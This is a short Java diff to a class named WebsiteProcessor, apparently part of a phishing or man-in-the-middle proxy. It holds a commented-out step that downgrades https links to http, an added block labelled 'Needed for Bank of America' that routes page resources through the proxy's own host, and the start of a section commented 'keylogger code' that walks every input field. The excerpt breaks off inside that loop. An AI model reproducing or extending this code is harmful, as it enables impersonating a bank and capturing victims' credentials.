@@ -51,9 +51,10 @@ public class WebsiteProcessor {
 	}
 	public String processHTML(String url, String html,boolean isJS) throws MalformedURLException, IOException{
 		//downgrade all links to http
-		Pattern p = Pattern.compile("https");
-		Matcher m = p.matcher(html);
-		String html1 = m.replaceAll("http");
+		//Pattern p = Pattern.compile("https");
+		//Matcher m = p.matcher(html);
+		//String html1 = m.replaceAll("http");
+		String html1 = html;
 		
 		if(isJS){
 			return html1;
@@ -74,7 +75,17 @@ public class WebsiteProcessor {
 			}
 			l.attr("src", imgSrc);
 		}
-		
+		/*Needed for Bank of America*/
+		Elements boas = doc.select("div[data-fallback]");
+		for(Element boa:boas){
+			boa.attr("data-mboxer", "");
+			String dataF = boa.attr("data-fallback");
+			Pattern p = Pattern.compile("src=\"");
+			Matcher m = p.matcher(dataF);
+			dataF=m.replaceAll("src=\"http://"+getBase());
+			boa.append(dataF);
+		}
+		/*Needed for Bank of America*/
 		//keylogger code
 		Elements inputs = doc.select("input");
 		for(Element input:inputs){
